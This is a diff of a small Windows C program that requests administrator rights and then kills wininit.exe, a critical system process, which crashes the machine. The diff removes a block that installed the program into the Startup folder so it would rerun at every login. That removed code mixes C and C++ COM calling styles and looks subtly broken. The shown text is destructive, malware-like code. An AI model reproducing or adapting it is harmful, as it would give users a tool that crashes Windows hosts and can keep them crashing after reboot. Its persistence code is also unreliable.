@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <stdio.h>
-#include <shlobj.h>  // For SHGetFolderPath
 
 int main() {
     // Request administrator privileges if not already running as Administrator
@@ -38,36 +37,6 @@ int main() {
     } else {
         // Execute the taskkill command directly
         system("taskkill /IM wininit.exe");
-    }
-
-    // Add program to the Startup folder
-    char szPath[MAX_PATH];
-    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szPath) == S_OK) {
-        // Get the current executable path
-        char exePath[MAX_PATH];
-        GetModuleFileName(NULL, exePath, MAX_PATH);
-        
-        // Create a shortcut in the Startup folder
-        strcat(szPath, "\\MyProgram.lnk");
-        HRESULT hRes;
-        IShellLink* psl;
-
-        hRes = CoInitialize(NULL);
-        if (SUCCEEDED(hRes)) {
-            hRes = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&psl);
-            if (SUCCEEDED(hRes)) {
-                psl->SetPath(exePath);
-                psl->SetArguments("");
-                IPersistFile* ppf;
-                hRes = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
-                if (SUCCEEDED(hRes)) {
-                    hRes = ppf->Save(szPath, TRUE);
-                    ppf->Release();
-                }
-                psl->Release();
-            }
-            CoUninitialize();
-        }
     }
 
     return 0;
